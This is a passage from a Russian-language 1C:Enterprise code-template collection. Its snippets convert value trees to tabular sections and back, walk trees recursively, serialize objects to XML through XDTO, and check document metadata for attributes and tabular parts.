	КолонкиТаблицы 	= ДокОбъект.Метаданные().ТабличныеЧасти[НаименованиеТабличнойЧастиДокумента].Реквизиты;
	ДеревоЗначений2 = Новый ДеревоЗначений;
	
	НовыйИД 		= Новый УникальныйИдентификатор(""00000000-0000-0000-0000-000000000000"");
	Для каждого Кол из КолонкиТаблицы Цикл
		Если Кол.Имя = ""НомерСтроки"" ИЛИ Кол.Имя = ""КлючСвязи"" Тогда
			Продолжить;
		Иначе
			ДеревоЗначений2.Колонки.Добавить(Кол.Имя, Новый ОписаниеТипов(Кол.Тип));
		КонецЕсли;
	КонецЦикла;//ДеревоЗначений.Строки.Очистить();
	
	Если КлючСвязи = Неопределено И ЭлементРодитель = Неопределено Тогда
		//ПЕРВЫЙ ВЫЗОВ ПРОЦЕДУРЫ (КОРНЕВЫЕ ЭЛЕМЕНТЫ)
		ИсточникВыборки = ДеревоЗначений2.Строки;
		КлючСвязи 		= НовыйИД; // ЭЛЕМЕНТ ВЕРХНЕГО УРОВНЯ ИМЕЕТ НОМЕР СТРОКИ РОДИТЕЛЯ 0 (ОБЯЗАТЕЛЬНЫЙ РЕКВИЗИТ)
	Иначе
		//ВНУТРЕННИЙ ВЫЗОВ ПРОЦЕДУРЫ (ПОДЧИНЕННЫЕ ЭЛЕМЕНТЫ)
		ИсточникВыборки = ЭлементРодитель.Строки;
	КонецЕсли;
	
	Фильтр 					= Новый Структура(""КлючСвязи"", КлючСвязи);
	лДочерниеПоКлючуСвязи 	= ДокОбъект[НаименованиеТабличнойЧастиДокумента].НайтиСтроки(Фильтр);
	Если лДочерниеПоКлючуСвязи.Количество() = 0 Тогда
		Возврат ДеревоЗначений2;
	КонецЕсли;
	
	Для каждого Стр из лДочерниеПоКлючуСвязи Цикл
		
		//Для каждого Кол из КолонкиТаблицы Цикл
		//	Если Кол.Имя = ""НомерСтроки"" ИЛИ Кол.Имя = ""КлючСвязи"" Тогда
		//		Продолжить;
		//	Иначе
		//		Элемент[Кол.Имя] = Стр[Кол.Имя];
		//	КонецЕсли;
		//КонецЦикла;
		
		Если КлючСвязи = НовыйИД И ЭлементРодитель = Неопределено Тогда
			Элемент 	= ИсточникВыборки.Добавить();
			ЗаполнитьЗначенияСвойств(Элемент, Стр);
			ТаблицаВДерево(ДокОбъект, НаименованиеТабличнойЧастиДокумента, Стр.ЭлементИД, Элемент); //ДОБАВЛЕНИЕ ПОДЧИНЁННЫХ ЭЛЕМЕНТОВ В ДЕРЕВО
			Прервать; //Заполнив корневой уровень и выйдя, т.к. в нём все элементы
			
		Иначе
			Если Стр.ЭлементИД <> НовыйИД Тогда
				Элемент 	= ИсточникВыборки.Добавить();
				ЗаполнитьЗначенияСвойств(Элемент, Стр);
				ТаблицаВДерево(ДокОбъект, НаименованиеТабличнойЧастиДокумента, Стр.ЭлементИД, Элемент); //ДОБАВЛЕНИЕ ПОДЧИНЁННЫХ ЭЛЕМЕНТОВ В ДЕРЕВО
			КонецЕсли;
		КонецЕсли;
		
	КонецЦикла;
	
	Возврат ДеревоЗначений2;
	
КонецФункции

//На форме
//Процедура КомандаТаблицуВДеревоНаСервере()
//	Дерево = ТаблицаВДерево(РеквизитФормыВЗначение(""Объект""), ""Товары"");//Товары - имя табличной части
//	ЗначениеВРеквизитФормы(Дерево, ""ДеревоЗначений"");//ДеревоЗначений - реквизит формы с типом дерево значений
//	Элементы.ДеревоЗначений.Обновить();
//КонецПроцедуры

//Процедура КомандаДеревоВТаблицуНаСервере()
//	Объект.Товары.Очистить();
//	ДОбъект = РеквизитФормыВЗначение(""Объект"");
//	ДеревоВТаблицу(ДОбъект, РеквизитФормыВЗначение(""ДеревоЗначений""), ""Товары"");
//	ЗначениеВРеквизитФормы(ДОбъект, ""Объект"");
//КонецПроцедуры

&НаКлиенте
Процедура ДеревоПриИзменении(Элемент)
	
	лТекущиеДанные 	= Элемент.ТекущиеДанные; 
	Если лТекущиеДанные <> Неопределено Тогда
		лЭлементыКорень 	= Дерево.ПолучитьЭлементы();
		
		Если лЭлементыКорень.Количество() = 1 Тогда
			лЭлементы 		= лЭлементыКорень[0].ПолучитьЭлементы();
			
			Если лЭлементы.Количество() > 0 Тогда
				Если НЕ ЗначениеЗаполнено(лТекущиеДанные.ЭлементИД) Тогда
					лТекущиеДанные.ЭлементИД 	= Новый УникальныйИдентификатор();
				КонецЕсли;	
			КонецЕсли; 
		Иначе
			лТекущиеДанные.ЭлементИД 	= Новый УникальныйИдентификатор(""00000000-0000-0000-0000-000000000000"");
		КонецЕсли; 
	КонецЕсли;  
	
КонецПроцедуры"}
},
{0,
{"Через НомерСтроки (целостность только в рамках себя)",0,0,"","1С 8.3 : Дерево значений в таблицу значений или в табличную часть и обратно

Для одной организации надо было реализовать документы, где вместо табличной части надо использовать дерево и все это на управляемых формах. Но дерево нельзя сохранить в базе в текущем виде. Пришлось использовать табличную часть документа для хранения данных дерева. И при открытии формы получать данные из ТЧ и выводить их в дерево. Далее все манипуляции производить с деревом и при сохранении документа помещать данные в обратно в ТЧ.

Поиск по интернету не дал нужного варианта, пришлось реализовавыть свой механизм, используя информацию которая была на просторах интернета.

Для реализации такого механизма в ТЧ был добавлен реквизит “КлючСвязи” (обязательный реквизит) с типом число, куда помещался “НомерСтроки” (стандартный реквизит ТЧ) родителя (верхний уровень). А самый верхний элемент дерева имеет “КлючСвязи” равный 0.

На картинке ниже видно структуру дерева и структуру ТЧ

Нагрузка на сервер осуществляется при окрытии и при сохранении документа. А с деревом работают уже на клиенте.

На рабочей базе обрабатывается около 200 строк в одном документе.

Открытие и сохранение документа происходит моментально. С большем количеством строк не тестировалось.

Чтобы алгорит правильно работал, у рекизита фомы с типом дерево значений должны быть все реквизиты табличной части, кроме “КлючСвязи” и “НомерСтроки”. Иначе платформа выдаст ошибку. В дерево можо добавлять свои реквизиты отличные от ТЧ, они будут использоваться только в дереве.

Ниже приведен код преобразования дерева в таблицу и обратно.
Код 1C v 8.2 УП

 &НаКлиенте
Процедура КомандаТаблицуВДерево(Команда)
	КомандаТаблицуВДеревоНаСервере();
КонецПроцедуры


&НаСервере
Процедура КомандаТаблицуВДеревоНаСервере()
	Дерево = ТаблицаВДерево(РеквизитФормыВЗначение(""Объект""), ""Товары"");//Товары - имя табличной части
	ЗначениеВРеквизитФормы(Дерево, ""ДеревоЗначений"");//ДеревоЗначений - реквизит формы с типом дерево значений
	Элементы.ДеревоЗначений.Обновить();
КонецПроцедуры


&НаКлиенте
Процедура КомандаДеревоВТаблицу(Команда)
	КомандаДеревоВТаблицуНаСервере();
КонецПроцедуры


&НаСервере
Процедура КомандаДеревоВТаблицуНаСервере()
	Объект.Товары.Очистить();
	ДОбъект = РеквизитФормыВЗначение(""Объект"");
	ДеревоВТаблицу(ДОбъект, РеквизитФормыВЗначение(""ДеревоЗначений""), ""Товары"");
	ЗначениеВРеквизитФормы(ДОбъект, ""Объект"");
КонецПроцедуры   

Формирование дерева из таблицы значений
Код 1C v 8.2 УП

 //ФОРМИРОВАНИЕ ДЕРЕВА ИЗ ТАБЛИЦЫ
&НаСервере
Функция ТаблицаВДерево(ДокОбъект, НаименованиеТабличнойЧастиДокумента, КлючСвязи = NULL, ЭлементРодитель = NULL) Экспорт	
	//ПОДГОТОВКА КОЛОНОК ДЕРЕВА
	КолонкиТаблицы = ДокОбъект.Метаданные().ТабличныеЧасти[НаименованиеТабличнойЧастиДокумента].Реквизиты;
	ДеревоЗначений2 = Новый ДеревоЗначений;
	Для каждого Кол из КолонкиТаблицы Цикл
		Если Кол.Имя = ""НомерСтроки"" ИЛИ Кол.Имя = ""КлючСвязи"" Тогда
			Продолжить;
		Иначе
			ДеревоЗначений2.Колонки.Добавить(Кол.Имя, Новый ОписаниеТипов(Кол.Тип));
		КонецЕсли;
	КонецЦикла;//ДеревоЗначений.Строки.Очистить();
	
	Если КлючСвязи = NULL И ЭлементРодитель = NULL Тогда
		//ПЕРВЫЙ ВЫЗОВ ПРОЦЕДУРЫ (КОРНЕВЫЕ ЭЛЕМЕНТЫ)
		ИсточникВыборки = ДеревоЗначений2.Строки;
		КлючСвязи = 0; // ЭЛЕМЕНТ ВЕРХНЕГО УРОВНЯ ИМЕЕТ НОМЕР СТРОКИ РОДИТЕЛЯ 0 (ОБЯЗАТЕЛЬНЫЙ РЕКВИЗИТ)
	Иначе
		//ВНУТРЕННИЙ ВЫЗОВ ПРОЦЕДУРЫ (ПОДЧИНЕННЫЕ ЭЛЕМЕНТЫ)
		ИсточникВыборки = ЭлементРодитель.Строки;
	КонецЕсли;
	Фильтр = Новый Структура(""КлючСвязи"", КлючСвязи);
	М = ДокОбъект[НаименованиеТабличнойЧастиДокумента].НайтиСтроки(Фильтр);
	Если М.Количество() = 0 Тогда
		Возврат ДеревоЗначений2;
	КонецЕсли;
	Для каждого Стр из М Цикл
		Элемент = ИсточникВыборки.Добавить();
		Для каждого Кол из КолонкиТаблицы Цикл
			Если Кол.Имя = ""НомерСтроки"" ИЛИ Кол.Имя = ""КлючСвязи"" Тогда
				Продолжить;
			Иначе
				Элемент[Кол.Имя] = Стр[Кол.Имя];
			КонецЕсли;
		КонецЦикла;
		ТаблицаВДерево(ДокОбъект, НаименованиеТабличнойЧастиДокумента, Стр.НомерСтроки, Элемент); //ДОБАВЛЕНИЕ ПОДЧИНЁННЫХ ЭЛЕМЕНТОВ В ДЕРЕВО
	КонецЦикла;
	Возврат ДеревоЗначений2;
КонецФункции
   

Формирование таблицы из дерева
Код 1C v 8.2 УП

 //ФОРМИРОВАНИЕ ТАБЛИЦЫ ИЗ ДЕРЕВА
&НаСервере
Процедура ДеревоВТаблицу(ДокОбъект, ДеревоЗначений, НаименованиеТабличнойЧастиДокумента, СтрокаДерева = NULL, КлючСвязи = NULL) Экспорт
	Если СтрокаДерева = NULL И КлючСвязи = NULL Тогда
		//ПЕРВЫЙ ВЫЗОВ ПРОЦЕДУРЫ (КОРНЕВЫЕ ЭЛЕМЕНТЫ)
		ПервыйВызов = Истина;
		ДокОбъект[НаименованиеТабличнойЧастиДокумента].Очистить();
		ИсточникВыборки = ДеревоЗначений.Строки;
		КлючСвязи = 0; // ЭЛЕМЕНТ ВЕРХНЕГО УРОВНЯ ИМЕЕТ НОМЕР СТРОКИ РОДИТЕЛЯ 0 (ОБЯЗАТЕЛЬНЫЙ РЕКВИЗИТ)
	Иначе
		//ВНУТРЕННИЙ ВЫЗОВ ПРОЦЕДУРЫ (ПОДЧИНЕННЫЕ ЭЛЕМЕНТЫ)
		ПервыйВызов = Ложь;
		ИсточникВыборки = СтрокаДерева.Строки;
	КонецЕсли;
	Для каждого Стр из ИсточникВыборки Цикл
		НС = ДокОбъект[НаименованиеТабличнойЧастиДокумента].Добавить();
		Для каждого Кол из ДокОбъект.Метаданные().ТабличныеЧасти[НаименованиеТабличнойЧастиДокумента].Реквизиты Цикл
			Если Кол.Имя = ""КлючСвязи"" Тогда
				НС.КлючСвязи = КлючСвязи
			ИначеЕсли Кол.Имя = ""НомерСтроки"" Тогда
				Продолжить;
			Иначе 
				НС[Кол.Имя] = Стр[Кол.Имя];
			КонецЕсли;
		КонецЦикла;
		Если НЕ Стр.Строки.Количество() = 0 Тогда
			ДеревоВТаблицу(ДокОбъект,,НаименованиеТабличнойЧастиДокумента, Стр, НС.НомерСтроки);
		КонецЕсли;
	КонецЦикла;
КонецПроцедуры"}
}
},
{0,
{"Обход дерева значений (рекурсивно)",0,0,"","//Процедура обхода всего дерева значений
//-------------------------------------------------------------------------
//Параметры:
//		СтрокиДерева 	- Тип 	- описание
//-------------------------------------------------------------------------
//автор: КучеровРМ 06.11.2018 
Процедура ОбойтиСтрокиДерева(СтрокаДерева, АргументПроцедуры)
	
	Для Каждого ТекСтрока Из СтрокаДерева.Строки Цикл
		
		Сообщить(ТекСтрока.ИмяРеквизита);
		Если ТекСтрока.Строки.Количество()> 0 Тогда
			ОбновитьСтрокиДерева(ТекСтрока, АргументПроцедуры);
		КонецЕсли;
		
	КонецЦикла;
	
КонецПроцедуры"}
},
{0,
{"ОбойтиУровеньДерева",0,0,"","Процедура ОбойтиУровеньДерева(Строки)
	
	Для каждого Строка из Строки Цикл
		
		//что-то делаем со строкой, например:
		Сообщить(Строка.ИмяСуществующегоВСтрокеРеквизита); 
		ОбойтиУровеньДерева(Строка.Строки);
		
	КонецЦикла; 
	
КонецПроцедуры

//Вызываем перебор так:

Дерево = Новый ДеревоЗначений;
Запрос = Новый Запрос;
Запрос.Текст=""ВЫБРАТЬ
|Ном.Ссылка как ссылка
|ИЗ
| Справочник.Номенклатура КАК Ном
|ИТОГИ ПО
|Ном.Ссылка ТОЛЬКО ИЕРАРХИЯ"";

Дерево = Запрос.Выполнить().Выгрузить(ОбходРезультатаЗапроса.ПоГруппировкамСИерархией);
// перебор дерева значений
ОбойтиУровеньДерева(Дерево.Строки); "}
},
{0,
{"Обойти дерево с учетом РеквизитФормыВЗначение",0,0,"","//Процедура ОтметитьКатегориюДерева
//-------------------------------------------------------------------------
//Параметры:
//		КатегорияСтатьи 	- ДанныеФормыЭлементДерева 	- описание
//-------------------------------------------------------------------------
//автор: КучеровРМ 07.11.2018 
&НаСервере
Процедура ОтметитьКатегориюДерева(КатегорияСтатьи)
	
	КатегорииДеревоЗначение = РеквизитФормыВЗначение(""КатегорииДерево"");
	Если ЗначениеЗаполнено(КатегорииДеревоЗначение) Тогда
		ОбойтиПодстроки(КатегорииДеревоЗначение.Строки, КатегорияСтатьи);
	КонецЕсли;
	ЗначениеВРеквизитФормы(КатегорииДеревоЗначение, ""КатегорииДерево"");
	
КонецПроцедуры
 
//Процедура обхода всего дерева значений
//-------------------------------------------------------------------------
//Параметры:
//		СтрокиДерева 	- ДанныеФормыЭлементДерева 	- Результат от КатегорииДерево.ПолучитьЭлементы()
//-------------------------------------------------------------------------
//автор: КучеровРМ 06.11.2018
&НаСервере
Процедура ОбойтиПодстроки(СтрокиДерева, КатегорияСтатьи)
	
	Для Каждого Строка Из СтрокиДерева Цикл
		Если Строка.Категория = КатегорияСтатьи Тогда
			Строка.Использование = Истина;	
		КонецЕсли;
		ОбойтиПодстроки(Строка.Строки, КатегорияСтатьи);
	КонецЦикла;
	
КонецПроцедуры"}
},
{0,
{"Работа с деревом значений в 1С 8.3",0,0,"","Работа с деревом значений в 1С 8.3
http://qa.erpstat.ru/public/00052.html

%Заполнение дерева на основании запроса
&НаСервере
Процедура КомандаЗаполнитьНаСервере()
    ЗапросДанных    = Новый Запрос(""ВЫБРАТЬ
                                   |    Номенклатура.Ссылка КАК Номенклатура
                                   |ИЗ
                                   |    Справочник.Номенклатура КАК Номенклатура
                                   |ГДЕ
                                   |    НЕ Номенклатура.ЭтоГруппа
                                   |ИТОГИ ПО
                                   |    Номенклатура ТОЛЬКО ИЕРАРХИЯ"");
    ЗначениеВРеквизитФормы(
        ЗапросДанных.Выполнить().Выгрузить(ОбходРезультатаЗапроса.ПоГруппировкамСИерархией),
    ""Дерево"");
КонецПроцедуры

%Обойти строки рекурсивно на клиенте
&НаКлиенте
Процедура ОбойтиРекурсивно(Команда)
    ОбойтиРекурсивноСтрокиДереваНаКлиенте(Дерево.ПолучитьЭлементы());
КонецПроцедуры
 
&НаКлиенте
Процедура ОбойтиРекурсивноСтрокиДереваНаКлиенте(Строки)
    Для Каждого СтрокаДерева Из Строки Цикл
        Сообщить(СтрокаДерева.Номенклатура);
         
        ПодчиненныеСтроки   = СтрокаДерева.ПолучитьЭлементы();
         
        Если ПодчиненныеСтроки.Количество() > 0 Тогда
            ОбойтиРекурсивноСтрокиДереваНаКлиенте(ПодчиненныеСтроки);
        КонецЕсли;
    КонецЦикла;
КонецПроцедуры

%Обойти строки рекурсивно на сервере
&НаСервере
Процедура ОбойтиРекурсивноНаСервереНаСервере()
    ДЗ  = РеквизитФормыВЗначение(""Дерево"");
     
    ОбойтиРекурсивноСтрокиДереваНаСервере(ДЗ);
КонецПроцедуры
 
&НаСервере
Процедура ОбойтиРекурсивноСтрокиДереваНаСервере(ДЗ)
    Для Каждого СтрокаДерева Из ДЗ.Строки Цикл
        Сообщить(СтрокаДерева.Номенклатура);
         
        Если СтрокаДерева.Строки.Количество() > 0 Тогда
            ОбойтиРекурсивноСтрокиДереваНаСервере(СтрокаДерева);
        КонецЕсли;
    КонецЦикла;
КонецПроцедуры

%Очистить строки дерева значений
// На стороне клиента
Дерево.ПолучитьЭлементы().Очистить();
 
// На стороне сервера
ДЗ  = РеквизитФормыВЗначение(""Дерево"");
ДЗ.Строки.Очистить();
ЗначениеВРеквизитФормы(ДЗ, ""Дерево"");

%Добавить новую строку в текущую ветку (на клиенте)
ИдентификаторСтроки = Элементы.Дерево.ТекущаяСтрока;
ТекущаяСтрока       = Дерево.НайтиПоИдентификатору(ИдентификаторСтроки);
НоваяСтрокаДерева   = ТекущаяСтрока.ПолучитьЭлементы().Добавить();

%Удалить текущую строку (на клиенте)
ИдентификаторСтроки = Элементы.Дерево.ТекущаяСтрока;
ТекущаяСтрока       = Дерево.НайтиПоИдентификатору(ИдентификаторСтроки);
СтрокаРодитель      = ТекущаяСтрока.ПолучитьРодителя();
 
Если СтрокаРодитель = Неопределено Тогда
    Дерево.ПолучитьЭлементы().Удалить(ТекущаяСтрока);
Иначе
    СтрокаРодитель.ПолучитьЭлементы().Удалить(ТекущаяСтрока);
КонецЕсли;
"}
},
{0,
{"Строки ДереваЗначений в ТЗ (создавая колонки и ЗаполнитьЗначенияСвойств) (строки только 1 уровня!)",0,0,"","<?""Имя дерева значение (слитно)"">ТЗ 	= Новый ТаблицаЗначений;

//Создадим колонки
Для каждого <?""Имя дерева значение (слитно)"">Колонка Из <?""Имя дерева значение (слитно)"">.Колонки Цикл
	
	<?""Имя дерева значение (слитно)"">ТЗ.Колонки.Добавить(<?""Имя дерева значение (слитно)"">Колонка.Имя, <?""Имя дерева значение (слитно)"">Колонка.ТипЗначения); 
	
КонецЦикла; 

//Заполним ТЗ
Для каждого <?""Имя дерева значение (слитно)"">Строка Из <?""Имя дерева значение (слитно)"">.Строки Цикл
	
	лСтрокаТЗ 	= <?""Имя дерева значение (слитно)"">ТЗ.Добавить();
	ЗаполнитьЗначенияСвойств(лСтрокаТЗ, <?""Имя дерева значение (слитно)"">Строка); 
	
КонецЦикла;"}
}
},
{0,
{"СериализироватьВXMLНаСервере и ДесериализоватьИзXMLНаСервере",0,0,"","&НаСервере
Процедура СериализироватьВXMLНаСервере();
	
	тСериализаторXDTO 	= Новый СериализаторXDTO(ФабрикаXDTO);
	
	тЗаписьXML 			= Новый ЗаписьXML;
	тЗаписьXML.ОткрытьФайл(""C:\test.xml"");
	
	тСериализаторXDTO.ЗаписатьXML(тЗаписьXML, Справочники.Тест.НайтиПоНаименованию(""Тест 1"").ПолучитьОбъект(), НазначениеТипаXML.Явное);
	
КонецПроцедуры

&НаСервере
Процедура ДесериализоватьИзXMLНаСервере()
	
	тСериализаторXDTO 	= Новый СериализаторXDTO(ФабрикаXDTO); 
	
	тЧтениеXML 			= Новый ЧтениеXML;
	тЧтениеXML.ОткрытьФайл(""C:\test.xml"");
	
	тСсылка 			= тСериализаторXDTO.ПрочитатьXML(тЧтениеXML);
	
КонецПроцедуры"}
},
{0,
{"СериализироватьВXMLНаСервере и ДесериализоватьИзXMLНаСервере 2",0,0,"","// Сериализировать
ОбъектXDTO 	= СериализаторXDTO.ЗаписатьXDTO(Объект);
ЗаписьXML 	= Новый ЗаписьXML; 
ЗаписьXML.ОткрытьФайл(ПутьКФайлу);

ФабрикаXDTO.ЗаписатьXML(ЗаписьXML, ОбъектXDTO);

ЗаписьXML.Закрыть();

// Десериализовать
ЧтениеXML 		= Новый ЧтениеXML; ЧтениеXML.ОткрытьФайл(ПутьКФайлу);
ТипОбъектаXDTO 	= ФабрикаXDTO.Тип(ТипОбъекта,ИмяОбъекта);
ОбъектXDTO 		= ФабрикаXDTO.ПрочитатьXML(ЧтениеXML,ТипОбъектаXDTO); ОбъектXDTO.Проверить();

ЧтениеXML.Закрыть();

Объект 			= СериализаторXDTO.ПрочитатьXDTO(ОбъектXDTO);"}
}
},
{2,
{"Преобразовать в значение (Реквизит, Данные формы)",1,0,"",""},
{0,
{"РеквизитФормыВЗначение",0,0,"РФВЗ","рфОбъектЗначение = РеквизитФормыВЗначение(""Объект"");

// Выполнение операций с Объектом ""рфОбъектЗначение""
<?>

ЗначениеВРеквизитФормы(рфОбъектЗначение, ""Объект"");"}
},
{0,
{"ДанныеФормыВЗначение",0,0,"ДФВЗ","дфОбъектЗначение = ДанныеФормыВЗначение(ОснРеквизит, Тип(""ДокументОбъект.АктСверкиВзаиморасчетов""));

// Выполнение операций с Объектом ""ОбъектЗначение""
<?>

ЗначениеВДанныеФормы(дфОбъектЗначение, ОснРеквизит);"}
}
},
{15,
{"Метаданные",1,0,"",""},
{2,
{"Реквизиты документа вывести",1,0,"",""},
{0,
{"Выгрузить реквизиты и ТЧ документа (Метаданные)",0,0,"","дерево 	= новый ДеревоЗначений;
дерево.Колонки.Добавить(""имя"");
дерево.Колонки.Добавить(""зн"");

об 		= Документы.ЗаказНаряд.НайтиПоНомеру(""ПА0000050363"");

Для каждого й из об.Метаданные().Реквизиты цикл
	
	Сообщить(""""+й.имя+ "" ""+об[й.имя]);
	
	стр 	= дерево.Строки.Добавить();
	стр.имя = й.имя;
	стр.зн 	= об[й.имя];
	
КонецЦикла;    

Для каждого й из об.Метаданные().ТабличныеЧасти цикл
	
	Сообщить("" ""+й.имя);
	
	тз 		= об[й.имя].выгрузить();//тч 
	
	стр 	= дерево.Строки.Добавить();
	стр.имя = й.имя;
	стр.зн 	= тз;
	
КонецЦикла"}
},
{0,
{"Выгрузить реквизиты и ТЧ документа (Метаданные) вывести",0,0,"","Для получения реквизитов документа можете использовать код:

Для Каждого Реквизит Из Документ.Метаданные().Реквизиты Цикл
	НоваяСтрока 			= РеквизитыДокумента.Добавить();
	НоваяСтрока.Реквизит 	= Реквизит.Имя;
	НоваяСтрока.Значение 	= Документ[Реквизит.Имя];
КонецЦикла;

РеквизитыДокумента - таблица значений с двумя полями ""Реквизит"" и ""Значение"".

А для получения табличных частей документа и их реквизитов можете использовать следующий код:

Для Каждого ТабличнаяЧасть Из Документ.Метаданные().ТабличныеЧасти Цикл
	Сообщить(ТабличнаяЧасть);
	Для Каждого РеквизитТЧ Из ТабличнаяЧасть.Реквизиты Цикл
		Сообщить(""  -  "" + РеквизитТЧ);
	КонецЦикла
КонецЦикла;"}
}
},
{0,
{"Быстро проверить Реквизит",0,0,"МетаРек","Если Компания.Метаданные().Реквизиты.Найти(""ИмяРеквизита"") <> Неопределено Тогда //Если найдены метаданные
		
КонецЕсли;"}
},
{0,
{"Быстро проверить ТЧ",0,0,"МетаТЧ","Если Компания.Метаданные().ТабличныеЧасти.Найти(""ИмяТЧ"") <> Неопределено Тогда //Если найдены метаданные
		
КонецЕсли;"}
},
{0,
{"Типовые УНФ ЦРМ",0,0,"","//Из CRM_ОбщегоНазначенияСервер
// Функция позволяет определить, есть ли среди реквизитов шапки документа
// реквизит с переданным именем.
//
// Параметры: 
//	ИмяРеквизита		- Строка		- Строковое имя искомого реквизита, 
//	МетаданныеДокумента	- Метаданные	- Объект описания метаданных документа, среди реквизитов которого производится поиск.
//
// Возвращаемое значение:
//	Истина - Результат поиска
//
Функция ЕстьРеквизитДокумента(ИмяРеквизита, МетаданныеДокумента) Экспорт
	Возврат НЕ (МетаданныеДокумента.Реквизиты.Найти(ИмяРеквизита) = Неопределено);
КонецФункции // ЕстьРеквизитДокумента()

// Функция позволяет определить, есть ли среди реквизитов ТЧ объекта
// реквизит с переданным именем.
//
// Параметры: 
//	ИмяРеквизита		- Строка		- Строковое имя искомого реквизита, 
//	МетаданныеДокумента	- Метаданные	- Объект описания метаданных документа, среди реквизитов которого производится поиск.
//	ИмяТабличнойЧасти	- Строка	- Имя табличной части объекта, в которой проверяем наличие реквизита.
//
// Возвращаемое значение:
//	Истина - Результат поиска
//
Функция ЕстьРеквизитТабличнойЧастиОбъекта(ИмяРеквизита, МетаданныеДокумента, ИмяТабличнойЧасти) Экспорт
	Если МетаданныеДокумента.ТабличныеЧасти.Найти(ИмяТабличнойЧасти) = Неопределено Тогда
		Возврат Ложь;
	Иначе
		Возврат НЕ (МетаданныеДокумента.ТабличныеЧасти[ИмяТабличнойЧасти].Реквизиты.Найти(ИмяРеквизита) = Неопределено);
	КонецЕсли;
КонецФункции // ЕстьРеквизитТабличнойЧастиОбъекта()

// Процедура удаляет проверяемый реквизит из массива проверяемых реквизитов.
Процедура УдалитьПроверяемыйРеквизит(ПроверяемыеРеквизиты, ПроверяемыйРеквизит) Экспорт
	
	НайденныйРеквизит = ПроверяемыеРеквизиты.Найти(ПроверяемыйРеквизит);
	Если ЗначениеЗаполнено(НайденныйРеквизит) Тогда
		ПроверяемыеРеквизиты.Удалить(НайденныйРеквизит);
	КонецЕсли;
	
КонецПроцедуры // УдалитьПроверяемыйРеквизит()"}
},
{0,
{"ТипВсеСсылки Содержит",0,0,"","ВсеСсылки 	= Справочники.ТипВсеСсылки();
ВсеСсылки.Содержит(Объект.Ссылка)"}
},
{0,
{"Тип элемента метаданных",0,0,"","Если ТипЗнч(ЗаказыПоставщикамУТ.СтруктурнаяЕдиница) = Тип(""СправочникСсылка.Кассы"") Тогда
	ПостБух.СтруктурнаяЕдиница 	= Справочники.Кассы.НайтиПоКоду(Код);    
Иначе    
	ПостБух.СтруктурнаяЕдиница 	= Справочники.БанковскиеСчета.НайтиПоКоду(Код);    
КонецЕсли;"}
},
{0,
{"ТипВсеСсылки СодержитТип",0,0,"","спрКонтрагенты 	= Справочники.Контрагенты;
Объект 			= спрКонтрагенты.НайтиПоКоду(""0000004"");

Если Справочники.ТипВсеСсылки().СодержитТип(ТипЗнч(Объект)) Тогда
    Сообщить(1);
ИначеЕсли Документы.ТипВсеСсылки().СодержитТип(ТипЗнч(Объект)) Тогда
    Сообщить(2);
КонецЕсли;"}
},
{0,
{"Реквизиты.Получить",0,0,"","Ссылка 	= Документ.Метаданные().Реквизиты.Получить(2).тип;"}
},
{0,
{"Метаданные().Имя",0,0,"","Документы.ВашДокумент.Метаданные().Имя
Справочники.ВашСправочник.Метаданные().Имя"}
},
{0,
{"Метаданные.<Имя>.Содержит",0,0,"","ТипЗначения 		= ТипЗнч(ВыбСчет);
ОбъектМетаданных 	= Метаданные.НайтиПоТипу(ТипЗначения);
Если Метаданные.Справочники.Содержит(ОбъектМетаданных) Тогда
    Сообщить(""Справочник"");
ИначеЕсли Метаданные.Документы.Содержит(ОбъектМетаданных) Тогда
    Сообщить(""Документ"");
КонецЕсли;"}
},
{0,
{"Присвоить Проверяя Метаданные реквизита",0,0,"","
// Значение - Чему присвоить
// ОбъектПроверки - Объект, реквизит которого проверяем, значение какого попытаемся присвоить
// ИмяРеквизита - Строка
// МетаданныеОбъекта - ОбъектМетаданных - Если они уже были получены раннее (чтобы не грузить систему лишний раз)
Функция ПрисвоитьРеквизитПроверяяМетаданные(Значение, ОбъектПроверки, ИмяРеквизита, МетаданныеОбъекта = Неопределено)
	
	Значение = Неопределено;
	
	Если МетаданныеОбъекта = Неопределено Тогда
		МетаданныеОбъекта = ОбъектПроверки.Метаданные();	
	КонецЕсли; 
	
	ТипПодходит = ТипЗнч(МетаданныеОбъекта) = Тип(""ОбъектМетаданных"");
	Если НЕ ТипПодходит Тогда
		Возврат Неопределено;	
	КонецЕсли; 
	
	ЕстьМетаданные = МетаданныеОбъекта.Реквизиты.Найти(ИмяРеквизита) <> Неопределено;
	
	Если ЕстьМетаданные Тогда
		Значение = ОбъектПроверки[ИмяРеквизита];
	Иначе
		Сообщить(""Не было присвоено значение, т.к. не найден нужный реквизит '"" + ИмяРеквизита + ""' в '"" + Строка(ОбъектПроверки) + ""'"");
	КонецЕсли;
	
	Возврат Значение;
	
КонецФункции // ПрисвоитьРеквизитПроверяяМетаданные()
 "}
},
{0,
{"Присвоить Проверяя Метаданные Универсально",0,0,"","// Значение - Чему присвоить
// ОбъектПроверки - Объект, реквизит которого проверяем, значение какого попытаемся присвоить
// ИмяРеквизита - Строка
// МетаданныеОбъекта - ОбъектМетаданных - Если они уже были получены раннее (чтобы не грузить систему лишний раз)
// ЭтоРеквизит - Истина, если это просто реквизит Объекта, иначе будет рассмотрен реквизит ТЧ (есть ли он)(но его значение не вернёт!) 
Функция ПрисвоитьРеквизитПроверяяМетаданные(Значение, ОбъектПроверки, ИмяРеквизита = """", ЭтоРеквизит = Истина, ИмяТабличнойЧасти = """", НомерСтрокиТЧ = 0, МетаданныеОбъекта = Неопределено,  ВозвращатьЕслиНетЗначения = Неопределено, ВыводитьСообщениеОбОшибке = Ложь)
	
	Значение = Неопределено;
	
	Если МетаданныеОбъекта = Неопределено Тогда
		МетаданныеОбъекта = ОбъектПроверки.Метаданные();	
	КонецЕсли; 
	
	ТипПодходит = ТипЗнч(МетаданныеОбъекта) = Тип(""ОбъектМетаданных"");
	Если НЕ ТипПодходит Тогда
		Возврат Неопределено;	
	КонецЕсли; 
	
	ЕстьИмяТабличнойЧасти 	= НЕ ПустаяСтрока(ИмяТабличнойЧасти);
	ЕстьИмяРеквизита 		= НЕ ПустаяСтрока(ИмяРеквизита);
	
	ЕстьМетаданные = Неопределено;
	
	Если ЭтоРеквизит Тогда
		ЕстьМетаданные = МетаданныеОбъекта.Реквизиты.Найти(ИмяРеквизита) <> Неопределено;
	Иначе
		Если ЕстьИмяТабличнойЧасти Тогда
			ОбъектТЧ = МетаданныеОбъекта.ТабличныеЧасти.Найти(ИмяТабличнойЧасти);
			ТЧЕстьМетаданные = ОбъектТЧ <> Неопределено;
			Если ТЧЕстьМетаданные Тогда
